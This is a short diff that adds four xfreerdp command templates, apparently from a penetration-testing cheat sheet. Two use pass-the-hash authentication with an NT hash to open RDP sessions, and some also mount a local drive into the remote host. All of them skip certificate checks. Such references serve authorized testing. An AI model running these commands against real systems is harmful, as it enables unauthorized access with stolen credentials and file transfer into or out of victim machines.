@@ -1,0 +1,4 @@
+xfreerdp /d:"$DOMAIN" /u:"$USER" /pth:"$NT_HASH" /v:"$TARGET" /cert-ignore
+xfreerdp /d:"$DOMAIN" /u:"$USER" /pth:"$NT_HASH" /v:"$TARGET" /cert-ignore /drive:"${SHARENAME},${LOCALPATH}"
+xfreerdp /d:"$DOMAIN" /u:"$USER" /p:"$PASSWORD" /v:"$TARGET" /cert-ignore
+xfreerdp /d:"$DOMAIN" /u:"$USER" /p:"$PASSWORD" /v:"$TARGET" /cert-ignore /drive:"${SHARENAME},${LOCALPATH}"
